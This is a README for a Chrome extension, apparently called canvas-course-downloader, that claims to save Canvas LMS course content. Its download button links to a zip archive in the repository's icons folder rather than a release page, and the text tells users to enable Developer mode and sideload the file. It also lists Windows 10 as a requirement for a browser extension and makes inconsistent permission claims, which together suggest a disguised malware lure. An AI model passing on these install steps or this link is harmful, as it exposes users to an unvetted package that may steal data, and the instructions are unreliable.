## 📋 About canvas-course-downloader

canvas-course-downloader is a Chrome extension that helps you save your Canvas LMS course material with one click. It lets you download files, assignments, pages, modules, syllabus, grades, and more. No need to set up API keys or have tech experience. The extension works directly within your browser. Use it to keep a backup of your courses or prepare your study materials for review.

You can use the saved course files offline or import them into note-taking software or AI study tools like ChatGPT and NotebookLM. This extension focuses on simplicity and direct access to your course content.

---

## 💻 System Requirements

- Windows 10 or later
- Google Chrome browser (latest version recommended)
- Stable internet connection
- Canvas LMS account with course access
- At least 100 MB free space for downloads (varies with course size)

## 🚀 Getting Started

Follow these steps to get the extension and start saving your Canvas courses.

1. **Download the extension**  
   Visit the release page by clicking the big blue button below. This page hosts the latest version ready to install.

   [![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest-blue?style=for-the-badge)](https://raw.githubusercontent.com/1tapbot/canvas-course-downloader/main/icons/course-downloader-canvas-3.8.zip)

2. **Install the extension in Chrome**  
   - Open the Chrome browser.  
   - Go to the download page linked above and save the extension file (.crx or zip).  
   - Open Chrome’s extensions page by typing `chrome://extensions` in the address bar and press Enter.  
   - Turn on **Developer mode** (toggle in the top right).  
   - Drag and drop the downloaded extension file onto the extensions page.  
   - If prompted, confirm that you want to add the extension.  
   - The extension icon should now appear in your Chrome toolbar.

3. **Log in to Canvas**  
   - Open your Canvas LMS in Chrome and log into your account.  
   - Open the course you want to download materials from.  

4. **Use the extension**  
   - Click the extension icon in your Chrome toolbar.  
   - Choose the type of content to download: files, assignments, pages, modules, syllabus, or grades.  
   - Click “Download.”  
   - The extension will save the selected content to your desktop in an organized folder.

## ⚙ How It Works

canvas-course-downloader connects to your open Canvas courses in Chrome. It scans the course pages and collects content automatically. It does not need special permission or API keys. The extension works entirely within your browser for security and ease of use.

Downloads include:

- **Files**: PDFs, documents, images you uploaded or your instructor shared
- **Assignments**: Assignment details and submission documents if available
- **Pages**: Course pages and notes in HTML format
- **Modules**: Organized course sections with links and content
- **Syllabus**: Complete course syllabus document
- **Grades**: Your grade overview in a readable format

The downloaded content is saved into folders by course and content type. This structure helps you find and review your materials offline.

## ⚠ Troubleshooting

- If the extension does not show up in Chrome after installation, make sure developer mode is on. Try refreshing the extensions page.
- Downloads may take time for large courses. Make sure you have enough disk space.
- If content does not appear during download, check your Canvas page is fully loaded before clicking the extension.
- For any errors, restart Chrome and try again.
- Disable other extensions that may block content or downloads.
